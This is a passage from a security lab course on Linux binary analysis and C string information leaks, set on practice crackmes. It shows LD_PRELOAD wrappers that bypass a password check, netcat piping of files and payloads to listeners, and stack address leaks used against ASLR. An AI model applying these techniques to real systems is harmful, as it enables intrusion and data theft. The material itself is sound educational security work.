    libacl.so.1 =&gt; /lib64/libacl.so.1 (0x00007f18a05cf000)
    libc.so.6 =&gt; /lib64/libc.so.6 (0x00007f18a021e000)
    libattr.so.1 =&gt; /lib64/libattr.so.1 (0x00007f189fdfc000)
    libpthread.so.0 =&gt; /lib64/libpthread.so.0 (0x00007f18a0001000)
    /lib64/ld-linux-x86-64.so.2 =&gt; /lib/ld-linux-x86-64.so.2 (0x00007f18a0c44000)
</code></pre><blockquote><p>When using the loader directly, make sure the loader and the executable are compiled for the same platform (e.g. they are both 64-bit or 32-bit).</p></blockquote><blockquote><p>You may find out more information about dynamic linker/loader variables in its man page. Issue the command</p></blockquote><pre tabindex=0><code>man ld-linux.so
</code></pre><blockquote><p>and search for the LD_ string to find variables information.</p></blockquote><p><code>ldd</code> shows us <strong>which</strong> libraries are loaded, but it&rsquo;s not any clearer how the loader knows <strong>where</strong> to load them from. First of all, the loader checks every dependency for a slash character. If it finds such a dependency it loads the library from that path, whether it is a relative of absolute path. But it is not the case in our example. For dependencies without slashes, the search order is as follows:</p><ul><li><code>DT_RPATH</code> attribute in the <code>.dynamic</code> section of the executable, provided there is no <code>DT_RUNPATH</code>; this is deprecated</li><li><code>LD_LIBRARY_PATH</code> environment variable, which is similar to PATH; does not work with SUID/SGID programs</li><li><code>DT_RUNPATH</code> attribute in the .dynamic section of the executable</li><li><code>/etc/ld.so.cache</code>, generated by <a href=https://man7.org/linux/man-pages/man8/ldconfig.8.html>ldconfig</a></li><li><code>/lib</code> and then <code>/usr/lib</code></li></ul><p>The last two options are skipped if the program was linked with the <code>-z nodeflib</code> option.</p><p>Now let&rsquo;s see exactly where the loader finds the libraries:</p><pre tabindex=0><code>$ LD_DEBUG=libs /bin/ls
     11451:    find library=librt.so.1 [0]; searching
     11451:     search cache=/etc/ld.so.cache
     11451:      trying file=/lib64/librt.so.1
     11451:
     11451:    find library=libacl.so.1 [0]; searching
     11451:     search cache=/etc/ld.so.cache
     11451:      trying file=/lib64/libacl.so.1
     11451:
     11451:    find library=libc.so.6 [0]; searching
     11451:     search cache=/etc/ld.so.cache
     11451:      trying file=/lib64/libc.so.6
     11451:
     11451:    find library=libpthread.so.0 [0]; searching
     11451:     search cache=/etc/ld.so.cache
     11451:      trying file=/lib64/libpthread.so.0
     11451:
     11451:    find library=libattr.so.1 [0]; searching
     11451:     search cache=/etc/ld.so.cache
     11451:      trying file=/lib64/libattr.so.1
</code></pre><p>The <code>LD_DEBUG</code> environment variable makes the dynamic loader be verbose about what it&rsquo;s doing. Try <code>LD_DEBUG=help</code> if you&rsquo;re curious about what else you can find out. We can see in the output listed above that all the libraries are found via the loader cache. The number at the beginning of each line is ls&rsquo;s PID.</p><p>And now we can discuss <strong>how</strong> the loader resolves symbols after it has found the libraries containing them. While variables are resolved when the library is opened, that is not the case for function references. When dealing with functions, the Linux dynamic loader uses something called lazy binding, which means that a function symbol in the library is not resolved until the very first call to it. Think about why this difference exists.</p><p>You can see the way lazy binding behaves:</p><pre tabindex=0><code>$ LD_DEBUG=symbols,bindings ./crackme2
...
     11480:    initialize program: ./crackme2
     11480:
     11480:
     11480:    transferring control: ./crackme2
     11480:
     11480:    symbol=puts;  lookup in file=./crackme2 [0]
     11480:    symbol=puts;  lookup in file=/lib32/libc.so.6 [0]
     11480:    binding file ./crackme2 [0] to /lib32/libc.so.6 [0]: normal symbol &#39;puts&#39; [GLIBC_2.0]
Password:
     11480:    symbol=fgets;  lookup in file=./crackme2 [0]
     11480:    symbol=fgets;  lookup in file=/lib32/libc.so.6 [0]
     11480:    binding file ./crackme2 [0] to /lib32/libc.so.6 [0]: normal symbol &#39;fgets&#39; [GLIBC_2.0]
I_pity_da_fool_who_gets_here_without_solving_crackme2
     11480:    symbol=strlen;  lookup in file=./crackme2 [0]
     11480:    symbol=strlen;  lookup in file=/lib32/libc.so.6 [0]
     11480:    binding file ./crackme2 [0] to /lib32/libc.so.6 [0]: normal symbol &#39;strlen&#39; [GLIBC_2.0]
     11480:    symbol=strcmp;  lookup in file=./crackme2 [0]
     11480:    symbol=strcmp;  lookup in file=/lib32/libc.so.6 [0]
     11480:    binding file ./crackme2 [0] to /lib32/libc.so.6 [0]: normal symbol &#39;strcmp&#39; [GLIBC_2.0]
Nope!
     11480:
     11480:    calling fini: ./crackme2 [0]
     11480:
</code></pre><p>As you can see, functions like <code>puts()</code>, <code>fgets()</code>, <code>strlen()</code> and <code>strcmp()</code> are not actually resolved until the first call to them is made. Make the loader resolve all the symbols at startup. (Hint: <a href=https://man7.org/linux/man-pages/man8/ld-linux.8.html>ld-linux</a>).</p><p><strong>Library Wrapper Task</strong></p><p>You&rsquo;ve previously solved <code>crackme2</code> with the help of the <code>ltrace</code>. Check out the files from <a href=./activities/04-tutorial-library-dependencies/src>04-tutorial-library-dependencies</a>. The folder consists of a <code>Makefile</code> and a C source code file reimplementing the <code>strcmp()</code> function (library wrapper). The <code>strcmp.c</code> implementation uses <code>LD_PRELOAD</code> to wrap the actual <code>strcmp()</code> call to our own.</p><p>In order to see how that works, we need to create a shared library and pass it as an argument to <code>LD_PRELOAD</code>. The <code>Makefile</code> already takes care of this. To build and run the entire thing, simply run:</p><pre tabindex=0><code>make run
</code></pre><p>This will build the shared library file (<code>strcmp.so</code>) and run the <code>crackme2</code> executable under <code>LD_PRELOAD</code>.</p><p>Our goal is to use the <code>strcmp()</code> wrapper to alter the program behavior. We have two ways to make the <code>crackme2</code> program behave our way:</p><ol><li>Leak the password in the <code>strcmp()</code> wrapper.</li><li>Pass the check regardless of what password we provide.</li></ol><p>Modify the <code>strcmp()</code> function in the <code>strcmp.c</code> source code file to alter the the <code>crackme2</code> program behavior in each of the two ways shown above. To test it, use the <code>Makefile</code>:</p><pre tabindex=0><code>make run
</code></pre><h3 id=05-tutorial---network-netstat-and-netcat>05. Tutorial - Network: netstat and netcat</h3><p>Services running on remote machines offer a gateway to those particular machines. Whether it&rsquo;s improper handling of the data received from clients, or a flaw in the protocol used between server and clients, certain privileges can be obtained if care is not taken. We&rsquo;ll explore some tools and approaches to analyzing remote services. To follow along, use the server and client programs from <a href=./activities/05-tutorial-network-netstat-netcat/src>05-tutorial-network-netstat-netcat</a>.</p><p>First of all, start the server:</p><pre tabindex=0><code>$ ./server
Welcome to the awesome server.
Valid commands are:
quit
status
</code></pre><p>Running any of them at this point doesn&rsquo;t offer much help. We&rsquo;ll come back to this later.</p><p>The most straightforward way to see what a server does is the <a href=https://man7.org/linux/man-pages/man8/netstat.8.html>netstat</a> utility.</p><pre tabindex=0><code>$ netstat -tlpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:36732           0.0.0.0:*               LISTEN      3062/steam
tcp        0      0 127.0.0.1:57343         0.0.0.0:*               LISTEN      3062/steam
tcp        0      0 127.0.0.1:31337         0.0.0.0:*               LISTEN      15022/./server
tcp        0      0 0.0.0.0:58154           0.0.0.0:*               LISTEN      3062/steam
tcp        0      0 127.0.0.1:60783         0.0.0.0:*               LISTEN      2644/SpiderOak
tcp        0      0 192.168.101.1:53        0.0.0.0:*               LISTEN      -
tcp        0      0 192.168.100.1:53        0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:44790           0.0.0.0:*               LISTEN      2644/SpiderOak
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
tcp6       0      0 :::631                  :::*                    LISTEN      -
</code></pre><p>Here we&rsquo;re looking at all the programs that are listening (<code>-l</code>) on a TCP port (<code>-t</code>). We&rsquo;re also telling netcat not to resolve hosts (<code>-n</code>) and to show the process that is listening (<code>-p</code>). We can see that our server is listening on port 31337. Let&rsquo;s keep that in mind and see how the client behaves.</p><pre tabindex=0><code>$ ./client
Usage: ./client &lt;client name&gt; &lt;server IP&gt; &lt;server port&gt;
$ ./client the_laughing_man localhost 31337
Welcome to the awesome server.
Valid commands are:
listclients
infoclient &lt;client name&gt; [ADMIN access required]
    name, IP, port, privileged, connected time
sendmsg &lt;client name&gt; &lt;message&gt;

Enter a command (or &#39;quit&#39; to exit):
listclients
Connected clients are:
the_laughing_man
Enter a command (or &#39;quit&#39; to exit):
sendmsg the_laughing_man test
Enter a command (or &#39;quit&#39; to exit):
Message from the_laughing_man
test

Enter a command (or &#39;quit&#39; to exit):
infoclient the_laughing_man
Not enough minerals!

Enter a command (or &#39;quit&#39; to exit):
</code></pre><p>So we can do anything except the privileged command <code>infoclient</code>. Running <code>status</code> on the server yields no information. What can we do now?</p><p>We can see what the server and client are exchanging at an application level by capturing the traffic with the <a href=https://man7.org/linux/man-pages/man1/tcpdump.1.html>tcpdump</a> utility. Start tcpdump, the server and then the client, and run the commands again. When you&rsquo;re done, stop tcpdump with Ctrl+C.</p><pre tabindex=0><code># tcpdump -i any -w crackme5.pcap &#39;port 31337&#39;
tcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 65535 bytes
^C21 packets captured
42 packets received by filter
0 packets dropped by kernel
</code></pre><p>Here we&rsquo;re telling tcpdump to listen on all available interfaces, write the capture to the <code>crackme5.pcap</code> file and only log packets that have the source or destination port equal to 31337.</p><p>We can then open our capture with <a href=https://www.wireshark.org/>wireshark</a> in order to analyze the packets in a friendlier manner.
You can look at the packets exchanged between server and client.
Notice that there seems to be some sort of protocol where values are delimited by the pipe character.
What is especially interesting is the first data packet sent from the client to the server, which sends <code>the_laughing_man|false</code>.
While we&rsquo;ve specified the client name, there was nothing we could specify via the client command-line in order to control the second value.</p><p>However, since this seems to be a plaintext protocol, there is an alternative course of action available.
The <a href=https://linux.die.net/man/1/nc>netcat</a> utility allows for arbitrary clients and servers.
It just needs a server address and a server port in client mode.
We can use it instead of the &ldquo;official&rdquo; client and see what happens when we craft the first message.
Go ahead!
Start the server again and a normal client.</p><blockquote><p>Connect to the server using <code>netcat</code>. Then send out the required string through the <code>netcat</code> connection with true as the second parameter and see if you can find out anything about the normal client.</p></blockquote><pre tabindex=0><code># netcat localhost 31337
Welcome to the awesome server.
Valid commands are:
listclients
infoclient &lt;client name&gt; [ADMIN access required]
    name, IP, port, privileged, connected time
sendmsg &lt;client name&gt; &lt;message&gt;
</code></pre><p><strong>Doing it in Python</strong></p><p>You can create a sever and a client in Python only. We can use the <code>server.py</code> and <code>client.py</code> scripts. Check them out first.</p><p>Then run the server by using:</p><pre tabindex=0><code>python server.py
</code></pre><p>It now accepts connections on TCP port 9999 as you can see by using <code>netstat</code>:</p><pre tabindex=0><code>$ netstat -tlpn
[...]
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN      12541/python
[...]
</code></pre><p>Now you can test it using the Python client:</p><pre tabindex=0><code>$ python client.py
sending &#39;anaaremere&#39;
received &#39;ANAAREMERE&#39;
</code></pre><p>We can do the same using netcat as the client:</p><pre tabindex=0><code>$ nc localhost 9999
anaaremere
ANAAREMERE
</code></pre><p><strong>Doing it Only with netcat</strong></p><p>We can still simulate a network connection using netcat only, both for starting the server and for runing the client.</p><p>Start the server with:</p><pre tabindex=0><code>$ nc -l -p 4444
</code></pre><p>Now run the client and send messages by writing them to standard input:</p><pre tabindex=0><code>$ nc localhost 4444
aaaaa
bbbbb
</code></pre><p>Messages you write to the client and up in the server.</p><p>This goes both ways: if you write messages on the server they end up in the client. Try that.</p><p>If you want to send a large chunk of data you can redirect a file. Start the server again:</p><pre tabindex=0><code>$ nc -l -p 4444
</code></pre><p>and now send the file to it:</p><pre tabindex=0><code>$ cat /etc/services | nc localhost 4444
</code></pre><p>It&rsquo;s now on the server side.</p><p>You can also do it with UDP, instead of TCP by using the <code>-u</code> flag both for the server and the client. Start the server using:</p><pre tabindex=0><code>$ nc -u -l -p 4444
</code></pre><p>And run the client using:</p><pre tabindex=0><code>$ cat /etc/services | nc -u localhost 4444
</code></pre><p>That&rsquo;s how we use netcat (the network swiss army knife).</p><blockquote><p>You can also look into <a href=https://linux.die.net/man/1/socat>socat</a> for a complex tool on dealing with sockets.</p></blockquote><h3 id=06-tutorial---open-files>06. Tutorial - Open files</h3><p>Let&rsquo;s remember how files and programs relate in Linux.</p><p><img src=assets/files.png alt=Files></p><p>Let&rsquo;s also remember that, in Linux, <code>file</code> can mean one of many things:</p><ul><li>regular file</li><li>directory</li><li>block device</li><li>character device</li><li>named pipe</li><li>symbolic or hard link</li><li>socket</li></ul><p>Let&rsquo;s look at the previous server from <code>crackme5</code>. Start it up once again.</p><p>While previously we&rsquo;ve used netstat to gather information about it, that was by no means the only solution. <a href=https://linux.die.net/man/8/lsof>lsof</a> is a tool that can show us what files a process has opened:</p><pre tabindex=0><code>$ lsof -c server
COMMAND  PID   USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME
server  9678 amadan  cwd    DIR    8,6     4096 1482770 /home/amadan/projects/sss/session01/crackmes/crackme5
server  9678 amadan  rtd    DIR    8,6     4096       2 /
server  9678 amadan  txt    REG    8,6    17524 1442625 /home/amadan/projects/sss/session01/crackmes/crackme5/server
server  9678 amadan  mem    REG    8,6  1753240 3039007 /lib64/libc-2.17.so
server  9678 amadan  mem    REG    8,6    88088 3039019 /lib64/libnsl-2.17.so
server  9678 amadan  mem    REG    8,6   144920 3038998 /lib64/ld-2.17.so
server  9678 amadan    0u   CHR  136,2      0t0       5 /dev/pts/2
server  9678 amadan    1u   CHR  136,2      0t0       5 /dev/pts/2
server  9678 amadan    2u   CHR  136,2      0t0       5 /dev/pts/2
server  9678 amadan    3u  IPv4 821076      0t0     TCP *:31337 (LISTEN)
</code></pre><p>We can see the standard file descriptors found in any process, as well as our socket.</p><ul><li><p>The <code>FD</code> column shows the file descriptor entry for a file, or a role in case of special files. We notice the current working directory (<code>cwd</code>), the root directory (<code>rtd</code>), the current executable (<code>txt</code>), some memory mapped files (<code>mem</code>) and the file descriptors (0-3). For normal file descriptors, <code>r</code> means read access, <code>w</code> means write access and <code>u</code> means both.</p></li><li><p>The <code>TYPE</code> column shows whether we&rsquo;re dealing with a directory (<code>DIR</code>), a regular file (<code>REG</code>), a character device (<code>CHR</code>), a socket (<code>IPv4</code>) or other type of file.</p></li><li><p>The <code>NODE</code> column shows the inode of the file, or a class marker as is the case for the socket.</p></li><li><p>The <code>NAME</code> column shows the path to the file, or the bound address and port for a socket.</p></li></ul><p>We&rsquo;ve left out some details since they are not relevant for our purposes. Feel free to read the manual page.</p><p>You could also get some hint that there is an open socket by looking into the <code>/proc</code> virtual filesystem:</p><pre tabindex=0><code>$ ls -l /proc/`pidof server`/fd
total 0
lrwx------ 1 amadan amadan 64 Jun 15 22:04 0 -&gt; /dev/pts/2
lrwx------ 1 amadan amadan 64 Jun 15 22:04 1 -&gt; /dev/pts/2
lrwx------ 1 amadan amadan 64 Jun 15 22:03 2 -&gt; /dev/pts/2
lrwx------ 1 amadan amadan 64 Jun 15 22:04 3 -&gt; socket:[883625]
</code></pre><p>We&rsquo;ll be using <a href=./activities/06-tutorial-open-files/src>crackme6</a> for the next part of this section.
Try the conventional means of <code>strings</code> and <code>ltrace</code> on it. Then run it normally.</p><pre tabindex=0><code>$ ./crackme6
Type &#39;start&#39; to begin authentication test
</code></pre><p>Before complying to what the program tells us, let&rsquo;s use <code>lsof</code> to see what we can find out:</p><pre tabindex=0><code>$ lsof -c crackme6
COMMAND    PID   USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME
crackme6 10466 amadan  cwd    DIR    8,6     4096 1482769 /home/amadan/projects/sss/session01/06-tutorial-open-files
crackme6 10466 amadan  rtd    DIR    8,6     4096       2 /
crackme6 10466 amadan  txt    REG    8,6    12922 5377126 /home/amadan/projects/sss/session01/06-tutorial-open-files/crackme6
crackme6 10466 amadan  mem    REG    8,6  1753240 3039007 /lib64/libc-2.17.so
crackme6 10466 amadan  mem    REG    8,6   100680 3039039 /lib64/libpthread-2.17.so
crackme6 10466 amadan  mem    REG    8,6   144920 3038998 /lib64/ld-2.17.so
crackme6 10466 amadan    0u   CHR  136,2      0t0       5 /dev/pts/2
crackme6 10466 amadan    1u   CHR  136,2      0t0       5 /dev/pts/2
crackme6 10466 amadan    2u   CHR  136,2      0t0       5 /dev/pts/2
crackme6 10466 amadan    3w  FIFO   0,32      0t0  988920 /tmp/crackme6.fifo
crackme6 10466 amadan    4r  FIFO   0,32      0t0  988920 /tmp/crackme6.fifo
</code></pre><p>There seems to be a named pipe used by the executable. Let&rsquo;s look at it:</p><pre tabindex=0><code>$ more /tmp/crackme6.fifo
</code></pre><p>Now go back again at the <code>crackme6</code> console and type <code>start</code>. If you see the message that the authentication test has succeeded, quit and try again. If you do not see the message, kill the <code>crackme6</code> process, look at the more command output and then delete the pipe file. Now try the password.</p><p><strong>Misc</strong></p><p>There are other sources of information available about running processes if you prefer to do things by hand such as:</p><ul><li><code>/proc/&lt;PID>/environ</code>: all environment variables given when the process was started</li><li><code>/proc/&lt;PID>/fd</code>: opened file descriptors.</li><li><code>/proc/&lt;PID>/mem</code>: address space layout</li><li><code>/proc/&lt;PID>/cwd</code>: symlink to working directory</li><li><code>/proc/&lt;PID>/exe</code>: symlink to binary image</li><li><code>/proc/&lt;PID>/cmdline</code>: complete program commandline, with arguments</li></ul><h2 id=challenges>Challenges</h2><p>Challenges can be found in the <code>activities/&lt;CHALLENGE_NUMBER>-challenge-&lt;CHALLENGE_NAME></code> directory.</p><h3 id=07-challenge---perfect-answer>07. Challenge - Perfect Answer</h3><p>For this task use the <a href=./activities/07-challenge-perfect-answer/src>perfect</a> binary.</p><p>Can you find the flag?</p><h3 id=08-challenge---lots-of-strings>08. Challenge - Lots of strings</h3><p>Use the <a href=./activities/08-challenge-lots-of-strings/src>lots_of_strings</a> binary.</p><p>Can you find the <strong>password</strong>?</p><blockquote><p>Hint: use the tools presented in the tutorials.</p></blockquote><h3 id=09-challenge---sleepy-cats>09. Challenge - Sleepy cats</h3><p>For this task use the <a href=./activities/09-challenge-sleepy-cats/src>sleepy</a> binary.</p><p>The <code>sleep()</code> function takes too much. Ain&rsquo;t nobody got time for that. We want the flag NOW!!</p><p>Modify the binary in order to get the flag.</p><blockquote><p>To edit a binary, you can use <a href=https://vim.fandom.com/wiki/Hex_dump#Editing_binary_files>vim + xxd</a> or <code>Bless</code>.
We strongly encourage you to use <code>Bless</code></p></blockquote><h3 id=10-challenge---hidden>10. Challenge - Hidden</h3><p>For this challenge use the <a href=./activities/10-challenge-hidden/src>hidden</a> binary.</p><p>Can you find the hidden flag?</p><blockquote><p>You could use <code>ltrace</code> and <code>strace</code> to find the flag. But try to make it give you the flag by simply altering the environment, do not attach to the executable.</p></blockquote><h3 id=11-challenge---detective>11. Challenge - Detective</h3><p>This challenge runs remotely at <code>141.85.224.157:31337</code>. You can use <code>netcat</code> to connect to it.</p><p>Investigate the <a href=./activities/11-challenge-detective/src>detective</a> binary. See what it does and work to get the flag.</p><p>You can start from the <a href=./activities/11-challenge-detective/sol>sol/exploit_template.sh</a> solution template script.</p><blockquote><p>There is a bonus to this challenge and you will be able to find another flag. See that below.</p></blockquote><p><strong>Bonus: Get the Second Flag</strong></p><p>You can actually exploit the remote <a href=./activities/11-challenge-detective/src>detective</a> executable and get the second flag. Look thoroughly through the executable and craft your payload to exploit the remote service.</p><blockquote><p>You need to keep the connection going. Use the construction: <code>cat /path/to/file - | nc &lt;host> &lt;port></code></p></blockquote><h3 id=extra>Extra</h3><p>If you want some more, have a go at the <a href=./activities/bonus/src>bonus</a> task. It is a simplified CTF task that you should be able to solve using the information learned in this lab.</p><blockquote><p>Hint: This executable needs elevated permissions (run with <code>sudo</code>).</p></blockquote><h3 id=further-pwning>Further pwning</h3><p><a href=http://pwnable.kr/>pwnable.kr</a> is a wargames site with fun challenges of different difficulty levels. After completing all tutorials and challenges in this session, you should be able to go there and try your hand at the following games from Toddler&rsquo;s bottle: <code>fd</code>, <code>collision</code>, <code>bof</code>, <code>passcode</code>, <code>mistake</code>, <code>cmd1</code>, <code>blukat</code> (of course, you are encouraged to try any other challenges, but they might get frustrating, as they require knowledge of notions we will explore in future sessions).</p><h2 id=further-reading>Further Reading</h2><ul><li><a href=https://man7.org/linux/man-pages/man1/ltrace.1.html>ltrace</a></li><li><a href=https://man7.org/linux/man-pages/man2/syscalls.2.html>syscalls</a></li><li><a href=https://man7.org/linux/man-pages/man2/ptrace.2.html>ptrace</a></li><li><a href=https://man7.org/linux/man-pages/man2/ptrace.2.html>ldconfig</a></li><li><a href=https://linux.die.net/man/1/socat>socat</a></li><li><a href=https://linux.die.net/man/8/lsof>lsof</a></li><li><a href=https://vim.fandom.com/wiki/Hex_dump#Editing_binary_files>vim + xxd</a></li></ul></div><div class=td-content style=page-break-before:always><h1 id=pg-e4a16c284332bf58c61e4344e785b929>6 -</h1><h1 id=information-leaks>Information Leaks</h1><hr><h2 id=introduction>Introduction</h2><hr><h4 id=objectives--rationale>Objectives & Rationale</h4><p>This is a tutorial based lab. Throughout this lab you will learn about frequent errors that occur when handling strings. This tutorial is focused on the C language. Generally, OOP languages (like Java, C#,C++) are using classes to represent strings &ndash; this simplifies the way strings are handled and decreases the frequency of programming errors.</p><h4 id=what-is-a-string>What is a string?</h4><p>Conceptually, a string is sequence of characters. The representation of a string can be done in multiple ways. One of the way is to represent a string as a contiguous memory buffer. Each character is <strong>encoded</strong> in a way. For example the <strong>ASCII</strong> encoding uses 7-bit integers to encode each character &ndash; because it is more convenient to store 8-bits at a time in a byte, an ASCII character is stored in one byte.</p><p>The type for representing an ASCII character in C is <code>char</code> and it uses one byte. As a side note, <code>sizeof(char) == 1</code> is the only guarantee that the <a href=http://www.open-std.org/jtc1/sc22/WG14/www/docs/n1256.pdf title=http://www.open-std.org/jtc1/sc22/WG14/www/docs/n1256.pdf>C standard</a> gives.</p><p>Another encoding that can be used is Unicode (with UTF8, UTF16, UTF32 etc. as mappings). The idea is that in order to represent an Unicode string, <strong>more than one</strong> byte is needed for <strong>one</strong> character. <code>char16_t</code>, <code>char32_t</code> were introduced in the C standard to represent these strings. The C language also has another type, called <code>wchar_t</code>, which is implementation defined and should not be used to represent Unicode characters.</p><p>Our tutorial will focus on ASCII strings, where each character is represented in one byte. We will show a few examples of what happens when one calls <em>string manipulation functions</em> that are assuming a specific encoding of the string.</p><p>You will find extensive information on ASCII in the <a href=http://man7.org/linux/man-pages/man7/ascii.7.html title=http://man7.org/linux/man-pages/man7/ascii.7.html>ascii man page</a>.</p><p>Inside an Unix terminal issue the command</p><pre tabindex=0><code class=language-{.code data-lang={.code>man ascii
</code></pre><h3 id=length-management>Length management</h3><hr><p>In C, the length of an ASCII string is given by its contents. An ASCII string ends with a <code>0</code> value byte called the <code>NUL</code> byte. Every <code>str*</code> function (i.e. a function with the name starting with <code>str</code>, such as <code>strcpy</code>, <code>strcat</code>, <code>strdup</code>, <code>strstr</code> etc.) uses this <code>0</code> byte to detect where the string ends. As a result, not ending strings in <code>0</code> and using <code>str*</code> functions leads to vulnerabilities.</p><h3 id=1-basic-info-leak-tutorial>1. Basic Info Leak (tutorial)</h3><p>Enter the <code>01-basic-info-leak/</code> subfolder. It's a basic information leak example.</p><p>In <code>basic_info_leak.c</code>, <code>buf</code> is supplied as input, hence is not trusted. We should be careful with this buffer. If the user gives <code>32</code> bytes as input then <code>strcpy</code> will copy bytes in <code>my_string</code> until it finds a <code>NUL</code> byte (<code>0x00</code>). Because the <a href=/courses/cns/labs/lab-05 title=cns:labs:lab-05>stack grows down</a>, on most
platforms, we will start accessing the content of the stack. After the <code>buf</code> variable the stack stores the <code>old rbp</code>, the function return address and then the function parameters. This information is copied into <code>my_string</code>. As such, printing information in <code>my_string</code> (after byte index <code>32</code>) using <code>puts()</code> results in information leaks.</p><p>We can test this using:</p><pre tabindex=0><code class=language-{.code} data-lang={.code}>$ python -c &#39;print(&#34;A&#34;*32)&#39; | ./basic_info_leak 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�8�
</code></pre><p>In order to check the hexadecimal values of the leak, we pipe the output
through <code>xxd</code>:</p><pre tabindex=0><code class=language-{.code} data-lang={.code}>$ python -c &#39;print(&#34;A&#34;*32)&#39; | ./basic_info_leak | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: d066 57b4 fc7f 0a                        .fW....
</code></pre><p>We have leaked one value above:</p><p>the lower non-0 bytes of the old/stored <code>rbp</code> value (right after the buffer): <code>0x7ffcb45766d0</code> (it's a little endian architecture); it will differ on your system</p><p>The return address usually doesn't change (except for executables with PIE, <em>Position Independent Executable</em> support). But assuming ASLR is enabled, the <code>rbp</code> value changes at each run. If we leak it we have a basic address that we can toy around to leak or overwrite other values. We'll see more of that in the <a href=#p_information_leak title="cns:labs:lab-07 ↵">Information Leak</a> task.</p><h3 id=2-information-leak>2. Information Leak</h3><p>We will now show how improper string handling will lead to information leaks from the memory. For this, please access the <code>02-info-leak/</code> subfolder. Please browse the <code>info-leak.c</code> source code file.</p><p>The snippet below is the relevant code snippet. The goal is to call the <code>my_evil_func()</code> function. One of the building blocks of exploiting a vulnerability is to see whether or not we have memory write. If you have memory writes, then getting code execution is a matter of getting things right. In this task we are assuming that we have memory write (i.e. we can write any value at any address). You can call the <code>my_evil_func()</code> function by overriding the return address of the <code>my_main()</code> function:</p><pre tabindex=0><code>#define NAME_SZ 32
 
static void read_name(char *name)
{
    memset(name, 0, NAME_SZ);
    read(0, name, NAME_SZ);
    //name[NAME_SZ-1] = 0;
}
 
static void my_main(void)
{
    char name[NAME_SZ];
 
    read_name(name);
    printf(&#34;hello %s, what address to modify and with what value?\n&#34;, name);
    fflush(stdout);
    my_memory_write();
    printf(&#34;Returning from main!\n&#34;);
}
</code></pre><p>What catches our eye is that the <code>read()</code> function call in the <code>read_name()</code> function read <strong>exactly</strong> <code>32</code> bytes. If we provide it <code>32</code> bytes it won't be null-terminated and will result in an information leak when <code>printf()</code> is called in the <code>my_main()</code> function.</p><h4 id=exploiting_the_memory_write_using_the_info_leak>Exploiting the memory write using the info leak</h4><p>Let's first try to see how the program works:</p><pre tabindex=0><code>$ python -c &#39;import sys; sys.stdout.write(10*&#34;A&#34;)&#39; | ./info_leak 
hello AAAAAAAAAA, what address to modify and with what value?
</code></pre><p>The binary wants an input from the user using the <code>read()</code> library call as we can see below:</p><pre tabindex=0><code>$ python -c &#39;import sys; sys.stdout.write(10*&#34;A&#34;)&#39; | strace -e read ./info_leak
read(3, &#34;\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\203\1\0004\0\0\0&#34;..., 512) = 512
read(0, &#34;AAAAAAAAAA&#34;, 32)               = 10
hello AAAAAAAAAA, what address to modify and with what value?
read(0, &#34;&#34;, 4)                          = 0
+++ exited with 255 +++
</code></pre><p>The input is read using the <code>read()</code> system call. The first read expects 32 bytes. You can see already that there's another <code>read()</code> call. That one is the first <code>read()</code> call in the <code>my_memory_write()</code> function.</p><p>As noted above, if we use exactly <code>32</code> bytes for name we will end up with a non-null-terminated string, leading to an information leak. Let's see how that goes:</p><pre tabindex=0><code>$ python -c &#39;import sys; sys.stdout.write(32*&#34;A&#34;)&#39; | ./info_leak
hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�)���, what address to modify and with what value?
 
$ python -c &#39;import sys; sys.stdout.write(32*&#34;A&#34;)&#39; | ./info_leak | xxd
00000000: 6865 6c6c 6f20 4141 4141 4141 4141 4141  hello AAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 f0dc ffff ff7f 2c20 7768  AAAAAA......, wh
00000030: 6174 2061 6464 7265 7373 2074 6f20 6d6f  at address to mo
00000040: 6469 6679 2061 6e64 2077 6974 6820 7768  dify and with wh
00000050: 6174 2076 616c 7565 3f0a                 at value?.
</code></pre><p>We see we have an information leak. We leak one piece of data above: <code>0x7fffffffdcf0</code>. If we run multiple times we can see that the values for the first piece of information differs:</p><pre tabindex=0><code class=language-{.code data-lang={.code>$ python -c &#39;import sys; sys.stdout.write(32*&#34;A&#34;)&#39; | ./info_leak | xxd | grep &#39;,&#39;
00000020: 4141 4141 4141 f0dc ffff ff7f 2c20 7768  AAAAAA......, wh
</code></pre><p>The variable part is related to a stack address (it starts with <code>0x7f</code>); it varies because ASLR is enabled. We want to look more carefully using GDB and figure out what the variable value represents:</p><pre tabindex=0><code class=language-{.code data-lang={.code>$ gdb -q ./info_leak
Reading symbols from ./info_leak...done.
gdb-peda$ b my_main
Breakpoint 1 at 0x400560
gdb-peda$ r &lt; &lt;(python -c &#39;import sys; sys.stdout.write(32*&#34;A&#34;)&#39;)
Starting program: info_leak &lt; &lt;(python -c &#39;import sys; sys.stdout.write(32*&#34;A&#34;)&#39;)
[...]
 
# Do next instructions until after the call to printf.
gdb-peda$ ni
....
 
gdb-peda$ x/12g name
0x7fffffffdc20: 0x4141414141414141  0x4141414141414141
0x7fffffffdc30: 0x4141414141414141  0x4141414141414141
0x7fffffffdc40: 0x00007fffffffdc50  0x00000000004007aa
gdb-peda$ x/2i 0x004007aa
   0x4007aa &lt;main+9&gt;:  mov    edi,0x4008bc
   0x4007af &lt;main+14&gt;: call   0x400550 &lt;puts@plt&gt;
gdb-peda$ pdis main
Dump of assembler code for function main:
   0x00000000004007a1 &lt;+0&gt;:    push   rbp
   0x00000000004007a2 &lt;+1&gt;:    mov    rbp,rsp
   0x00000000004007a5 &lt;+4&gt;:    call   0x400756 &lt;my_main&gt;
